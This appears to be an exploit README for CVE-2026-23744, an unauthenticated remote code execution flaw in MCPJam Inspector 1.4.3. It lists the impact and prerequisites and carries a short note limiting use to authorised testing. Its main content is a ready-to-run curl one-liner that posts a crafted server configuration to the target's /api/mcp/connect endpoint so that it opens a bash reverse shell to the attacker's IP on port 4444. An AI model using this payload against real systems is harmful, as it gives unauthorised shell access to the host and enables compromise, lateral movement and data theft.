# CVE-2026-23744 — MCPJam Inspector Unauthenticated RCE -Version 1.4.3


## Impact

- Full remote code execution in the context of the MCPJam Inspector process
- Complete compromise of the host system
- Lateral movement potential within the target network
- Data exfiltration, malware deployment, or persistent backdoor installation

---

## Exploit

### Prerequisites

- Python 3.x with `requests` library, or simply `curl`
- Network access to the target on port `6274` (default)
- **Authorized penetration testing only** — ensure explicit written permission

### One-liner (curl)

```bash
curl -s http://<TARGET_IP>:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwned"
  }'
